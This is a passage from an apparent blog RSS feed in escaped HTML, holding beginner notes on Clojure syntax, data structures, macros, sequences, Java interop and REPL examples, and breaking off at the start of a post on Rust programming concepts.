+&lt;li&gt;Only &lt;code class=&quot;language-text&quot;&gt;false&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;nil&lt;/code&gt; are logically false in clojure, everything else is logically true.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Null - nil&lt;/li&gt;
+&lt;li&gt;Regex Patterns - #“a*b”&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Data Structures&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Lists - singly linked (grows at front)
+&lt;ul&gt;
+&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;(1 2 3 4 5) (fred ethel lucy) (list 1 2 3)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Vectors - indexed access, grow at end
+&lt;ul&gt;
+&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;[1 2 3 4 5] [fred  ethel lucy]&lt;/code&gt; // Anything can be a element of a vector&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Maps - key/value associations
+&lt;ul&gt;
+&lt;li&gt;Unordered (Hash Map)&lt;/li&gt;
+&lt;li&gt;Constant or Near Constant Time LookUp&lt;/li&gt;
+&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;{:a 1, :b 1, :c 3} {1 &quot;ethel&quot; 2 &quot;fred&quot;}&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Sets
+&lt;ul&gt;
+&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;#{fred ethel lucy}&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Everything Nests&lt;/li&gt;
+&lt;li&gt;All are heterogeneous&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Syntax&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Data Structures are the code&lt;/li&gt;
+&lt;li&gt;Homoiconicity&lt;/li&gt;
+&lt;li&gt;No more text-based syntax!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Java Evaluation&lt;/h3&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/e924f1d0234b57b7ba0bccc98cff2041/dc616/eval-java.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 53.16455696202532%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABEUlEQVQoz41S7W6DMAzk/R9rfYN11eioNFg6Fj6TiA8BKdzkSGlZCFpP8o849uVydgAA8zxjGAaM40hHLMvyJ2zOwpe3uYAO0zShLEoT60a3wYXvzhBqrVHXAkIIZDxDWZa46ZtRvqfO5pRSSJIEeZ4/FLogYlIrpTJW+GywhPT44eWA+DN+KHSL+r5H+B7i9HZC+p2a89539aRRFIWxbUO4LiSSruuMwqqqTBPlmqa5NxNokGSZ7Q2eGQB5Sd5eogviODakBHrw+HoE+2L7hO4a2OA/HGEY4nz+gJLK1BDxlV3Rtq2f0AffunDOkWc5RC02dcEzZO7Q0jRFFEVgjG1+8q9CLJ7Jag0p5X0468X+BWFTXpbRIXllAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;Java Evaluation&quot;
+        title=&quot;Java Evaluation&quot;
+        src=&quot;/static/e924f1d0234b57b7ba0bccc98cff2041/f058b/eval-java.png&quot;
+        srcset=&quot;/static/e924f1d0234b57b7ba0bccc98cff2041/c26ae/eval-java.png 158w,
+/static/e924f1d0234b57b7ba0bccc98cff2041/6bdcf/eval-java.png 315w,
+/static/e924f1d0234b57b7ba0bccc98cff2041/f058b/eval-java.png 630w,
+/static/e924f1d0234b57b7ba0bccc98cff2041/dc616/eval-java.png 933w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;Clojure Evaluation&lt;/h3&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/1d404397b65a405be1f968572038f759/dc616/eval-cloj.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 53.16455696202532%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA90lEQVQoz5WSaW6DMBCFuf+xmiMkpOEPKYmjgsFQ9sXAi8aVaWPZaTqSxSzy8zczeACwLAuGYcA4jtDxPM/KX9f14at9M69zHgVSSqRpqo5pNsFntU0wz3MURQHOObI0UzkitRH9jsuyRPQRgSf8h9B8vSi+FG1VVdsYTDF9R2QCu7cdzuH5m9B8mazrOpzeT/B9H4wxtG2LaZqs7VIn1JGue64hk2jTNOrQKIiE/L7vHyhpmSSq73qvLuDGbjj6R4RhiPgzhhACSZzgsD/gEl3cgq7h13WNIAjArmxblpSzWiLVrIIue/bLmLH3l5CN2NXFy4T/sTvyEWCGLQwmlAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;Clojure Evaluation&quot;
+        title=&quot;Clojure Evaluation&quot;
+        src=&quot;/static/1d404397b65a405be1f968572038f759/f058b/eval-cloj.png&quot;
+        srcset=&quot;/static/1d404397b65a405be1f968572038f759/c26ae/eval-cloj.png 158w,
+/static/1d404397b65a405be1f968572038f759/6bdcf/eval-cloj.png 315w,
+/static/1d404397b65a405be1f968572038f759/f058b/eval-cloj.png 630w,
+/static/1d404397b65a405be1f968572038f759/dc616/eval-cloj.png 933w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;Interactivity, Programs Writing Programs and Syntactic Abstractions&lt;/h3&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/b82f4b6865f1c4c8ffe73e6ccd29e7c9/f73a1/adv-clj.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 67.72151898734178%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAABd0lEQVQ4y41Ta4+CMBDs//9jZ3J+OQPqCYdBRZCHvKSAr7lMTT0g6rnJEijb2dmZVtR1DSbjer32Uq8N49F/vSZ2ux2Y5/P53039Ajz8L+I4Rpqm8H0fQRDgdDq9zZBZFiU8z0McJ4qU4ENnVVWIwghZlqn3y+XyVAb9vnJXGH2MYBqmIiOGLGzLhvPjwHEcHA6Hl+wYrDHNKZIkuY2sC8mIzFzXxdJZKsCtt4W/9ZFnuaoh42Fwsi5zkcQJwjBUYLpLlw1BAj9AHMVgLRmxuawkirwAPWBDDSoIxuK+gf2xrIWF8edY5Wa9QbpPURQF1qs1ZtOZ0vHuMrvQKR3H41GJm+e5cp5HigwJZNs22rbtjRtFEaSUfyOTflmWdx3VaMlNBn02uWGf7FV2L8FQnp4p2rHF9wLz2Vyx01HLWmlMrdqmfXmrxHCRbChD11FKwAYE1Kwf3h7N8Nmt0N90cvI1gWEY95PwFuCzUaSslRSWZaFpmpeAv8yuQjieRJ31AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;Interacitivity and Programs Writing Programs&quot;
+        title=&quot;Interacitivity and Programs Writing Programs&quot;
+        src=&quot;/static/b82f4b6865f1c4c8ffe73e6ccd29e7c9/f058b/adv-clj.png&quot;
+        srcset=&quot;/static/b82f4b6865f1c4c8ffe73e6ccd29e7c9/c26ae/adv-clj.png 158w,
+/static/b82f4b6865f1c4c8ffe73e6ccd29e7c9/6bdcf/adv-clj.png 315w,
+/static/b82f4b6865f1c4c8ffe73e6ccd29e7c9/f058b/adv-clj.png 630w,
+/static/b82f4b6865f1c4c8ffe73e6ccd29e7c9/f73a1/adv-clj.png 822w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;The program generates the data structures and these data structures are then compiled. There are macros.&lt;/p&gt;
+&lt;h2&gt;Expressions&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Everything is an expression&lt;/li&gt;
+&lt;li&gt;All data literals represent themselves
+&lt;ul&gt;
+&lt;li&gt;Except:
+&lt;ul&gt;
+&lt;li&gt;Symbols -&gt; Looks for binding to value, locally then globally.&lt;/li&gt;
+&lt;li&gt;Lists -&gt; A form of operation.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Operations&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;(op …) -&gt; general format of operations&lt;/li&gt;
+&lt;li&gt;Clojure will try to evaluate the first thing inside the paranthesis as a function call.&lt;/li&gt;
+&lt;li&gt;The open ends need not always be a data arguement and can be an expression or a function call, whose output is used.&lt;/li&gt;
+&lt;li&gt;An op can be :
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;one of very few &lt;code class=&quot;language-text&quot;&gt;Special Ops&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;macro&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;expression which yields a function&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Special Ops: (They may not be evaluated)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;(&lt;code class=&quot;language-text&quot;&gt;def&lt;/code&gt; name value-expr)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;establishes a global variable&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;(&lt;code class=&quot;language-text&quot;&gt;if&lt;/code&gt; text-expr then-expr else-expr)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Conditional, evaluates only one of then/else.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Other Special Ops:&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;fn let loop recur do new . throw try set! quote var&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Macros&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Supplied with Clojure&lt;/li&gt;
+&lt;li&gt;Arguement forms are passed as data to the macro function, which returns a new data structure as a replacement for the macro call.&lt;/li&gt;
+&lt;li&gt;Macro handling occurs at compile time.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;clj&quot;&gt;&lt;pre class=&quot;language-clj&quot;&gt;&lt;code class=&quot;language-clj&quot;&gt;(or x y) ; or is not primitive it can be defined in terms of if
+
+becomes
+
+(let [or__158 x]
+    (if or__158 or__158 y))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Many things built into other languages are just macros in Clojure.&lt;/p&gt;
+&lt;h2&gt;Functions&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;First Class Values&lt;/li&gt;
+&lt;li&gt;Maps, Vectors and Sets and all are functions in Clojure&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;clj&quot;&gt;&lt;pre class=&quot;language-clj&quot;&gt;&lt;code class=&quot;language-clj&quot;&gt;    (def five 5)
+    (def sqr (fn [x] (* x x)))
+    (sqr five)
+    &amp;gt;&amp;gt;&amp;gt; 25
+    (def m{:fred :ethel :ricky :lucy})
+    (m :fred)
+    :ethel&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Syntax Summary clj // java&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;clj&quot;&gt;&lt;pre class=&quot;language-clj&quot;&gt;&lt;code class=&quot;language-clj&quot;&gt;(def i 5) ; int i = 5;
+
+(if (zero? x) y z) ; if(x == 0)
+                   ;        return y;
+                   ;   else
+                   ;         return z;
+
+(* x y z) // x * y * z
+
+(foo x y z) // foo(x, y, z); 
+
+(. foo bar x) // foo.bar(x)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Sequences&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Abstraction of Lisp Lists&lt;/li&gt;
+&lt;li&gt;(seq coll)
+&lt;ul&gt;
+&lt;li&gt;if collection is non-empty, return seq object on it, else nil&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;(first seq)
+&lt;ul&gt;
+&lt;li&gt;returns first element&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;(rest seq)
+&lt;ul&gt;
+&lt;li&gt;returns a seq of the rest of the elements, or nil if no more. All but the first.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Sequence Library&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;clj&quot;&gt;&lt;pre class=&quot;language-clj&quot;&gt;&lt;code class=&quot;language-clj&quot;&gt;(drop 2 [1 2 3 4 5])
+&amp;gt;&amp;gt;&amp;gt; (3 4 5)
+
+(take 9 (cycle [1 2 3 4]))
+&amp;gt;&amp;gt;&amp;gt; (1 2 3 4 1 2 3 4 1)
+
+(interleave [:a :b :c :d :e] [1 2 3 4 5])
+&amp;gt;&amp;gt;&amp;gt; (:a 1 :b 2 :c 3 :d 4 :e 5)
+
+(partition 3 [1 2 3 4 5 6 7 8 9])
+&amp;gt;&amp;gt;&amp;gt; ((1 2 3) (4 5 6) (7 8 9))
+
+(map vector [:a :b :c :d :e] [1 2 3 4 5])
+&amp;gt;&amp;gt;&amp;gt; ([:a 1] [:b 2] [:c 3] [:d 4] [:e 5])
+
+(apply str(interpose \, &amp;quot;asdf&amp;quot;))
+&amp;gt;&amp;gt;&amp;gt; &amp;quot;a,s,d,f&amp;quot;
+
+(reduce + (range 100))
+&amp;gt;&amp;gt;&amp;gt; 4950&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Java Interoperability&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;clj&quot;&gt;&lt;pre class=&quot;language-clj&quot;&gt;&lt;code class=&quot;language-clj&quot;&gt;(. Math PI)
+&amp;gt;&amp;gt;&amp;gt; 3.14159265
+
+(.. System getProperties (get &amp;quot;java.version&amp;quot;))
+&amp;gt;&amp;gt;&amp;gt; &amp;quot;1.5.0_13&amp;quot;
+
+(new java.util.Date)
+&amp;gt;&amp;gt;&amp;gt; Thu Jun 05 12:37:32 EDT 2008
+
+(doto (JFrame.) (add (JLabel. &amp;quot;Hello World&amp;quot;)) pack show)
+
+;expands to:
+(let* [G__1837 (JFrame.)]
+    (do (. G__1837 (add (JLabel. &amp;quot;Hello World&amp;quot;)))
+        (. G__1837 pack)
+        (. G__1837 show))
+    G__1837)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;REPL&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Read Eval Print Loop&lt;/li&gt;
+&lt;li&gt;Interactive Shell&lt;/li&gt;
+&lt;li&gt;Used for exploratory Programming&lt;/li&gt;
+&lt;li&gt;Provided a quick feedback cycle&lt;/li&gt;
+&lt;li&gt;Connect to the application running in production&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;clj&quot;&gt;&lt;pre class=&quot;language-clj&quot;&gt;&lt;code class=&quot;language-clj&quot;&gt;Clojure 1.11.1
+&amp;gt;&amp;gt; &amp;quot;i am a string&amp;quot;
+&amp;quot;i am a string&amp;quot;
+
+; Equality
+&amp;gt;&amp;gt; (= 1 2)
+false
+
+; Add
+&amp;gt;&amp;gt; (+ 1 2 3 4)
+10
+
+; Multiply
+&amp;gt;&amp;gt; (* 1 2 3 4)
+24
+
+; Return first element
+&amp;gt;&amp;gt; (first [1 2 3 4])
+1
+
+; apply a function to all element in a sequence and return the resulting sequence
+&amp;gt;&amp;gt; (map inc [1 2 3])
+(2 3 4)
+
+; Remove based on a condition (here zero? checks for = 0)
+&amp;gt;&amp;gt; (remove zero? [1 0 2 0 3 0])
+(1 2 3)
+
+; Comments look like this
+
+; if statement
+&amp;gt;&amp;gt; (if true &amp;quot;hello&amp;quot; &amp;quot;bye&amp;quot;)
+&amp;quot;hello&amp;quot;
+
+&amp;gt;&amp;gt; (if false &amp;quot;hello&amp;quot;)
+nil ; the else part returns nil automatically (if test-form then-form else-form)
+
+&amp;gt;&amp;gt; (if (zero? 1) (inc 1) (dec 1))
+0 ; 1 not equal to 0, so (dec 1) = 0
+
+&amp;gt;&amp;gt; (if (zero? 0) (inc 1) (dec 1))
+2 ; 0 equal to 0, so (inc 1) = 2
+
+; do operator (allows us to wrap multiple forms together and run them as one expression)
+&amp;gt;&amp;gt; (if true (do (println &amp;quot;hello&amp;quot;) (println &amp;quot;world&amp;quot;)) (do (println &amp;quot;bye&amp;quot;) &amp;quot;good bye&amp;quot;))
+hello ; this is a side effect of println
+world ; this is a side effect of println
+nil ; this is a return value of (println &amp;quot;world&amp;quot;) and the return value of (println &amp;quot;hello&amp;quot;) is ignored.
+; in do, the return value is the return value of the expression that is evaluated last.
+
+&amp;gt;&amp;gt; (do &amp;quot;clojure&amp;quot; &amp;quot;is fun&amp;quot;)
+&amp;quot;is fun&amp;quot; ; &amp;quot;clojure&amp;quot; is avoided and only &amp;quot;is fun&amp;quot; is returned by do, since it is the last form to be evaluated.
+
+;when operator - used when there is no else part. Combination of if and do. It can also be written just using &amp;#39;if&amp;#39; and &amp;#39;do&amp;#39;.
+&amp;gt;&amp;gt; (when true (println (+ 1 2)) (+ 1 4))
+3 ; side effect of println
+5 ; return value of &amp;#39;when&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;A valid clojure expression is called a form, every form returns a value. By convention, if a function returns a true/false(predicate function), we suffix it with a question mark. A function that does a mutataion, we suffix an exclamation mark.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;CTRL + L is used to clear REPL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Rust Programming Concepts]]></title><description><![CDATA[This post is my understanding of the common programming concepts, implemented in Rust. They cover stuff like, Variables and Mutability…]]></description><link>https://gatsbyglass.netlify.app/blog/rust-chap3/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/blog/rust-chap3/</guid><pubDate>Wed, 01 Mar 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post is my understanding of the common programming concepts, implemented in Rust. They cover stuff like,&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#variables-and-mutability&quot;&gt;Variables and Mutability&lt;/a&gt;
 &lt;ul&gt;
